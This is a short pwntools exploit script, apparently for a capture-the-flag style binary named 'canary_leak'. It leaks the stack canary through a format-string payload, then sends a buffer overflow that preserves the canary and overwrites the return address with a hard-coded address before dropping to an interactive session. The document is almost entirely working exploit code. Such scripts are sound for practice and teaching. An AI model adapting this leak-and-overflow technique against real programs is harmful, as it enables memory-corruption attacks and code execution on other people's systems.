from pwn import *

p = process('./canary_leak')
gdb.attach(p, gdbscript='break *vuln+75')

#leak canary
payload = b"%21$p";
p.sendline(payload)
p.readline()
canary = int(p.readline().decode(), 16)
print("Canary:", hex(canary))

payload += b"A" * 99
payload += p64(canary)
payload += b"B" * 8
payload += p64(0x00000000004011d6)
p.sendline(payload)
p.interactive()
